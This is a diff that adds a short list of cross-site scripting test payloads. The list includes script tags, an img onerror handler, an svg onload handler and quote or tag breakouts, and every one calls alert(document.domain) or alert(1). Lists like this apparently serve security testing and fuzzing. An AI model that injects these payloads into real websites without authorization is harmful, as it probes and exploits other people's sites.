@@ -1,0 +1,7 @@
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+"><script>alert(document.domain)</script>
+'><script>alert(document.domain)</script>
+</script><script>alert(document.domain)</script>
+<script>alert`1`</script>
